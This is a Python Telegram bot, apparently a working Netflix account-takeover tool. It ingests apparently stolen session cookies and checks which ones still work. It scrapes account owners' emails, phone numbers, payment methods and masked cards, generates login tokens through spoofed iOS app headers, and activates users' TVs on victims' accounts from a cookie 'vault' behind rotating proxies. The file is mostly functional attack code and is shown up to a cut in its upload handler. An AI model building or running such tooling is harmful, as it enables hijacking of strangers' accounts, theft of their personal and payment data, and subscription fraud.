import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
import codecs
import html as html_mod
import random
import string
import threading
import http.server
import socketserver
from collections import OrderedDict, defaultdict
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from telegram.error import BadRequest
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse
from flask import Flask

# ----------------- कॉन्फिगरेशन -----------------
TOKEN = os.environ.get('BOT_TOKEN', "Bot Token Here")
OWNER_ID = 1115202962
ADMIN_IDS = [1115202962]  # आवश्यक असल्यास तुमचा ॲडमिन आयडी इथे टाका
WATERMARK = "Made By @ShinchanNoharaTG | @M3UIndiaOriginal"

MAX_WORKERS = 20
BATCH_SIZE = 10
dot_length = 5
MAX_LIVE_HITS = 20

COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

cookie_lock = threading.Lock()
tv_stats_lock = threading.Lock()

tv_stats = {
    "total_logins": 0,
    "successful": 0,
    "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

START_MSG = (
    "<code>\n"
    " █ NETFLIX MULTI-TOOL BOT █\n\n"
    "[ Step 1 ] Choose mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file\n"
    "[ Step 3 ] Get results\n"
    "</code>"
    "<a href=\"https://t.me/KindCoders\">‎ </a>"
)

MAIN_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔍 Check Account", callback_data="mode_check"),
     InlineKeyboardButton("🔑 Get NF Token", callback_data="mode_nftoken")],
    [InlineKeyboardButton("🧹 Clean Cookies", callback_data="mode_clean"),
     InlineKeyboardButton("📺 Free TV Login", callback_data="mode_tvlogin")]
])

CHECK_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("▶️ Start Checking", callback_data="start_check")]
])

STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🛑 Stop", callback_data="stop_check"),
     InlineKeyboardButton("📋 Get Hits", callback_data="get_hits")]
])

RESULT_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📄 Get as .txt", callback_data="result_txt"),
     InlineKeyboardButton("📦 Get as .zip", callback_data="result_zip")]
])

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

user_locks = defaultdict(asyncio.Lock)
user_state = {}
user_executors = {}
user_tasks = {}

# ----------------- 24x7 Render Pinger -----------------
class PingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self): 
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Server Active")
    def log_message(self, format, *args):
        return

def run_always_on_pinger():
    time.sleep(20)
    while True:
        try:
            render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://checker-9kyv.onrender.com")
            requests.get(render_url, timeout=12)
            print("[*] 24x7 Active-Pulse Sent Successfully. Server Kept Awake.")
        except: 
            pass
        time.sleep(540)

def run_http_server():
    PORT = int(os.environ.get("PORT", 5000))
    with socketserver.TCPServer(("", PORT), PingHandler) as httpd:
        print(f"HTTP Server serving at port {PORT}")
        httpd.serve_forever()

# ----------------- युटिलिटी फंक्शन्स -----------------
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def clean_unicode(val):
    if not isinstance(val, str):
        return val
    try:
        val = codecs.decode(val, 'unicode_escape')
    except:
        pass
    try:
        val = html_mod.unescape(val)
    except:
        pass
    val = val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
    val = ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')
    return val

def safe_html(text):
    if not text:
        return "Unknown"
    text = clean_unicode(str(text))
    text = text.encode('ascii', errors='replace').decode('ascii', errors='replace')
    return text

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

EMAIL_RE = re.compile(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})')
PHONE_RE = re.compile(r'(\+?\d{2})\d{2,}(\d{2})')

def scrub_text(text: str) -> str:
    if not text:
        return "Unknown"
    text = safe_html(text)
    text = EMAIL_RE.sub(lambda m: f"{m.group(1)}***{m.group(2)}", text)
    text = PHONE_RE.sub(lambda m: f"{m.group(1)}******{m.group(2)}", text)
    return text

NETFLIX_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent", 
    "flwssn", "memclid", "profilesNewSession", "clSharedContext"
}

def parse_cookie_file(text):
    text = text.strip()
    results = []
    
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cookie_dict = {k: str(v) for k, v in obj.items() if k in NETFLIX_COOKIE_NAMES}
                if cookie_dict.get('NetflixId'):
                    results.append(("json_block", cookie_dict))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    merged = {}
                    for cookie in obj["cookies"]:
                        if isinstance(cookie, dict) and "name" in cookie and "value" in cookie:
                            if cookie["name"] in NETFLIX_COOKIE_NAMES:
                                merged[cookie["name"]] = cookie["value"]
                    if merged.get('NetflixId'):
                        results.append(("json_cookies", merged))
            elif isinstance(obj, list):
                merged = {}
                for cookie in obj:
                    if isinstance(cookie, dict):
                        name = cookie.get("name") or cookie.get("key")
                        value = cookie.get("value")
                        if name and value and name in NETFLIX_COOKIE_NAMES:
                            merged[name] = value
                if merged.get('NetflixId'):
                    results.append(("json_list", merged))
    except:
        pass

    netscape_entries = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#") and not line.startswith("#HttpOnly_"):
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            if name in NETFLIX_COOKIE_NAMES:
                domain = parts[0].replace("#HttpOnly_", "")
                netscape_entries.append({
                    "name": name, "value": value,
                    "domain": domain, "path": parts[2],
                    "secure": parts[3], "expires": parts[4]
                })
    
    if netscape_entries:
        netflix_ids = [(i, e) for i, e in enumerate(netscape_entries) if e["name"] == "NetflixId"]
        for nf_idx, nf_entry in netflix_ids:
            cookie_set = {"NetflixId": nf_entry["value"]}
            for entry in netscape_entries:
                if entry["name"] != "NetflixId":
                    cookie_set[entry["name"]] = entry["value"]
            results.append((f"netscape_{nf_idx}", cookie_set))
        if not netflix_ids:
            merged = {}
            for e in netscape_entries:
                merged[e["name"]] = e["value"]
            if merged:
                results.append(("netscape_all", merged))
    
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        sc = {}
        for part in line.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                k, v = k.strip(), v.strip()
                if k in NETFLIX_COOKIE_NAMES:
                    sc[k] = v
        if sc.get('NetflixId'):
            results.append((f"semicolon_{len(results)}", sc))

    kv = {}
    for line in text.splitlines():
        line = line.strip()
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            k, v = k.strip(), v.strip()
            if k in NETFLIX_COOKIE_NAMES:
                kv[k] = v
    if kv.get('NetflixId'):
        results.append(("keyvalue", kv))

    nf_pattern = r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})'
    nf_matches = re.findall(nf_pattern, text, re.IGNORECASE)
    for nf_val in nf_matches:
        nf_val = nf_val.strip('"\'')
        cs = {"NetflixId": nf_val}
        for cn in NETFLIX_COOKIE_NAMES - {"NetflixId"}:
            m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
            if m:
                cs[cn] = m.group(1).strip('"\'')
        results.append((f"regex_{len(results)}", cs))
    
    return results

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir() or info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (blockname, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except:
                        continue
    return cookies

def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId', 'cookie': cookie_dict}
    
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        urls = [
            'https://www.netflix.com/YourAccount',
            'https://www.netflix.com/account',
            'https://www.netflix.com/account/membership',
        ]
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=25, allow_redirects=True)
                if r.status_code == 200 and 'Account' in r.text:
                    resp = r
                    txt = r.text
                    break
            except:
                continue
        
        if not resp or resp.status_code != 200:
            return {'ok': False, 'reason': f'HTTP {resp.status_code if resp else "error"}', 'cookie': cookie_dict}

        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {'ok': False, 'reason': 'Redirected to login', 'cookie': cookie_dict}
        
        def find(pattern):
            m = re.search(pattern, txt)
            return safe_html(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        plan = clean_unicode(plan_raw) if plan_raw else None
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"') or find(r'"loginId"\s*:\s*"([^"]+)"')
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"') or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"') or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        payment = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"') or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
        card = find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"') or find(r'"displayText"\s*:\s*"([^"]+)"')
        phone = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"') or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
        phone_ver = "Yes" if re.search(r'"isVerified":true', txt) else "No" if re.search(r'"isVerified":false', txt) else None
        quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"') or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
        streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)') or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
        hold = "Yes" if re.search(r'"isUserOnHold":true', txt) else "No" if re.search(r'"isUserOnHold":false', txt) else None
        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No" if re.search(r'"showExtraMemberSection"', txt) else None
        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No" if re.search(r'"emailVerified"\s*:\s*false', txt) else None
        guid = find(r'"userGuid":\s*"([^"]+)"') or find(r'"ownerGuid"\s*:\s*"([^"]+)"')
        
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms = status_match.group(1) if status_match else None
        is_prem = ms == 'CURRENT_MEMBER' if ms else bool(plan and 'free' not in str(plan).lower())

        has_data = any([name, email, country, plan, ms, guid])
        is_valid = has_data and 'Account' in txt
        
        if not is_valid and not has_data:
            return {'ok': False, 'reason': 'No account data found', 'cookie': cookie_dict}

        profiles = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text)
                if not profiles:
                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text)
        except:
            pass
        profiles_str = ", ".join([safe_html(p) for p in profiles]) if profiles else None
        
        return {
            'ok': True, 'premium': is_prem, 'name': name or 'Unknown',
            'country': country or 'Unknown', 'plan': plan or 'Unknown',
            'plan_price': plan_price or 'Unknown', 'member_since': member_since or 'Unknown',
            'next_billing': next_billing or 'Unknown', 'payment_method': payment or 'Unknown',
            'masked_card': card or 'Unknown', 'phone': phone or 'Unknown',
            'phone_verified': phone_ver or 'Unknown', 'video_quality': quality or 'Unknown',
            'max_streams': streams or 'Unknown', 'on_payment_hold': hold or 'Unknown',
            'extra_member': extra or 'Unknown', 'email_verified': email_ver or 'Unknown',
            'email': email or 'Unknown', 'profiles': profiles_str or 'Unknown',
            'user_guid': guid or 'Unknown', 'membership_status': ms or 'Unknown',
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e), 'cookie': cookie_dict}

def generate_nftoken(cookie_dict):
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=20, verify=False)
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = td.get("token")
        expires = td.get("expires")
        if not token:
            return None, "Dead cookie"
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {'token': token, 'expires': expiry, 'expires_unix': expires}, None
    except Exception as e:
        return None, str(e)

def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    m = re.match(r'^(https?|socks5h?)://(?:([^:@]+):([^@]+)@)?([^:]+):(\d+)$', line, re.IGNORECASE)
                    if m:
                        s, u, p, h, port = m.groups()
                        url = f"{s}://{u}:{p}@{h}:{port}" if u else f"{s}://{h}:{port}"
                        proxies.append({"http": url, "https": url})
    return proxies

proxies_list = load_proxies()

def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())

def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()

def extract_cookie_dict_tv(content):
    entries = {}
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = canonicalize_name(parts[5])
            if is_netflix_cookie(parts[0], name):
                entries[name] = parts[6]
    if entries.get("NetflixId"):
        return entries

    try:
        data = json.loads(content)
        if isinstance(data, dict):
            data = data.get("cookies") or data.get("items") or [data]
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict):
                    name = canonicalize_name(c.get("name", ""))
                    if is_netflix_cookie(c.get("domain", ""), name):
                        entries[name] = str(c.get("value", ""))
    except:
        pass
    if entries.get("NetflixId"):
        return entries
    
    for cn in ALL_COOKIE_NAMES:
        m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', content, re.IGNORECASE)
        if m:
            entries[cn] = m.group(1).strip('"\'')
    return entries if entries.get("NetflixId") else None

def validate_cookie_tv(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html,application/xhtml+xml"}
    try:
        r = session.get("https://www.netflix.com/YourAccount", headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        if 'login' in r.url.lower() or 'signin' in r.url.lower() or r.status_code != 200:
            return False, None, None

        country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text) or re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        plan_match = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text) or re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
        
        country = country_match.group(1) if country_match else None
        plan = plan_match.group(1) if plan_match else "Unknown"
        has_account = 'Account' in r.text or 'membershipStatus' in r.text
        return has_account and country is not None, country, plan
    except:
        return False, None, None

def extract_auth_url(html_text):
    patterns = [r'name="authURL"\s+value="([^"]+)"', r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']', r'authURL=([^&\s"\']+)', r'value="(c1\.[^"]+)"']
    for pat in patterns:
        m = re.search(pat, html_text)
        if m:
            return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None

def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {"User-Agent": USER_AGENT, "Accept": "text/html,application/xhtml+xml"}
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": f"TV page unavailable (HTTP {r.status_code})"}
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)[:50]}"}
    
    auth_url = extract_auth_url(r.text)
    if not auth_url:
        return {"success": False, "error": "Could not load activation page"}

    form_data = {
        "flow": "websiteSignUp", "authURL": auth_url, "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2", "code": tv_code,
        "tvLoginRendezvousCode": tv_code, "action": "nextAction",
    }
    post_headers = {**headers, "Content-Type": "application/x-www-form-urlencoded", "Referer": "https://www.netflix.com/tv8", "Origin": "https://www.netflix.com"}
    
    try:
        r = session.post(url, data=form_data, headers=post_headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        return {"success": False, "error": f"Activation request failed: {str(e)[:50]}"}

    final_url = r.url
    if "/tv/out/success" in final_url.lower() or ("success" in final_url.lower() and "tv" in final_url.lower()):
        return {"success": True, "error": None}

    text_clean = re.sub(r'<[^>]+>', ' ', r.text)
    text_clean = html_mod.unescape(text_clean)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip().lower()
    
    success_patterns = [r"your tv is ready", r"successfully activated"]
    for pat in success_patterns:
        if re.search(pat, text_clean):
            return {"success": True, "error": None}

    error_patterns = [r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong|expired)"]
    for pat in error_patterns:
        if re.search(pat, text_clean):
            return {"success": False, "error": "Invalid or expired TV code"}

    if "/tv/" in final_url.lower() and "code" not in final_url.lower():
        return {"success": True, "error": None}
    return {"success": False, "error": f"Unknown response"}

def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR):
        return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]

def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files:
            return None, None
        filename = random.choice(files)
        filepath = os.path.join(COOKIES_DIR, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            os.remove(filepath)
            return filename, content
        except:
            return None, None

def count_vault_cookies():
    return len(get_vault_cookies())

def process_tv_login(tv_code):
    max_attempts = min(100, max(count_vault_cookies() * 2, 50))
    attempts = 0
    tried_countries = []
    
    while attempts < max_attempts:
        attempts += 1
        filename, content = get_random_cookie_file()
        if not filename:
            return {"success": False, "error": "no_cookies_left"}
        
        cookies = extract_cookie_dict_tv(content)
        if not cookies or not cookies.get('NetflixId'):
            continue
        
        proxy = random.choice(proxies_list) if proxies_list else None
        valid, country, plan = validate_cookie_tv(cookies, proxy)
        if not valid:
            continue
        if country:
            tried_countries.append(country)

        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code, proxy)
        result["country"] = country
        result["plan"] = plan
        result["cookie_file"] = filename
        result["tried_countries"] = tried_countries
        
        if result["success"] or "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
            return result
    return {"success": False, "error": "all_cookies_failed", "tried_countries": tried_countries}

BRAILLE = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

async def animate_message(ctx, chat_id, msg_id, stop_event):
    idx = 0
    while not stop_event.is_set():
        f = BRAILLE[idx % len(BRAILLE)]
        try:
            await ctx.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id,
                text=f"{f} Searching vault for working cookie...\n\nTrying cookies one by one...\nPlease wait..."
            )
        except:
            pass
        idx += 1
        await asyncio.sleep(0.3)

# ----------------- टेलिग्राम हँडलर्स -----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            await update.message.reply_html("⚠️ Already processing. Please stop first.", reply_markup=STOP_MARKUP)
            return
        user_state[user_id] = {'mode': 'check', 'cookies': [], 'stop': False, 'busy': False}
        await update.message.reply_html(START_MSG, reply_markup=MAIN_MARKUP)

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            await query.answer("Already processing!")
            return
        
        modes = {
            "mode_check": ("check", "🔍 Account Check mode! Upload file."),
            "mode_nftoken": ("nftoken", "🔑 NF Token mode! Upload file."),
            "mode_clean": ("clean", "🧹 Clean Cookies mode! Upload messy file."),
            "mode_tvlogin": ("tvlogin", None),
        }
        
        if query.data in modes:
            mode, msg = modes[query.data]
            user_state[user_id] = {'mode': mode, 'cookies': [], 'stop': False, 'busy': False}
            
            if mode == "tvlogin":
                await query.answer("📺 Free TV Login activated!")
                await context.bot.send_message(chat_id,
                    "<b>📺 Free TV Login</b>\n\n"
                    "1. Open Netflix on your TV\n"
                    "2. Get the 8-digit code from screen\n"
                    "3. Send: <code>/tv YOUR_CODE</code>\n\n"
                    f"🍪 Cookies in vault: <b>{count_vault_cookies()}</b>",
                    parse_mode='HTML')
            else:
                await query.answer(msg)
                await context.bot.send_message(chat_id, f"<b>{msg}</b>\n\nUpload your .txt/.json/.zip file.", parse_mode='HTML')

async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    msg_id = update.message.message_id
    
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: <code>/tv 12345678</code>\n\nGet the 8-digit code from your TV screen.", parse_mode='HTML', reply_to_message_id=msg_id)
        return
    
    tv_code = re.sub(r'\D', '', args[0])
    if len(tv_code) != 8:
        await update.message.reply_text("❌ TV code must be exactly 8 digits!", parse_mode='HTML', reply_to_message_id=msg_id)
        return
    
    vault_count = count_vault_cookies()
    if vault_count == 0:
        await update.message.reply_text("😔 <b>No cookies in vault!</b>\n\nAdmin needs to upload cookies using /upload command.", parse_mode='HTML', reply_to_message_id=msg_id)
        return
    
    status_msg = await update.message.reply_text(
        f"🔍 <b>Starting TV login...</b>\n📺 Code: <code>{tv_code}</code>\n🍪 Vault: <b>{vault_count}</b> cookies\n\nSearching for working cookie...",
        parse_mode='HTML', reply_to_message_id=msg_id)
    
    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(animate_message(context, chat_id, status_msg.message_id, stop_anim))
    
    result = await asyncio.to_thread(process_tv_login, tv_code)
    
    stop_anim.set()
    await asyncio.sleep(0.3)
    
    with tv_stats_lock:
        tv_stats["total_logins"] += 1
        if result["success"]:
            tv_stats["successful"] += 1
            resp = (f"✅ <b>TV ACTIVATED SUCCESSFULLY!</b>\n\n📺 Code: <code>{tv_code}</code>\n🌍 Country: <b>{result.get('country', 'N/A')}</b>\n📦 Plan: <b>{result.get('plan', 'N/A')}</b>\n\n<i>Your TV is now ready to watch Netflix!</i> 🍿\n\n🍪 Remaining in vault: <b>{count_vault_cookies()}</b>")
        elif result.get("error") == "no_cookies_left":
            tv_stats["failed"] += 1
            resp = "😔 <b>All cookies exhausted!</b>\n\nNo more cookies in vault. Wait for admin to upload more."
        elif result.get("error") == "all_cookies_failed":
            tv_stats["failed"] += 1
            tried = result.get('tried_countries', [])
            resp = (f"❌ <b>All cookies failed!</b>\n\nTried {len(tried)} cookies\nCountries: {', '.join(set(tried)) if tried else 'N/A'}\n\nVault is now empty.")
        elif "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
            tv_stats["codes_rejected"] += 1
            resp = (f"❌ <b>Invalid or Expired TV Code</b>\n\n📺 Code: <code>{tv_code}</code>\n🌍 Cookie country: <b>{result.get('country', 'N/A')}</b>\n\n<i>Please check your TV screen and get a fresh code.</i>")
        else:
            tv_stats["codes_rejected"] += 1
            resp = (f"❌ <b>Activation Failed</b>\n\n📺 Code: <code>{tv_code}</code>\n⚠️ {result.get('error', 'Unknown error')}")
    
    await status_msg.edit_text(resp, parse_mode='HTML')

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only!")
        return
    
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("📎 Reply to a ZIP file with <code>/upload</code>", parse_mode='HTML')
        return
    
    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.zip'):
        await update.message.reply_text("❌ Only .zip files accepted!")
        return
    
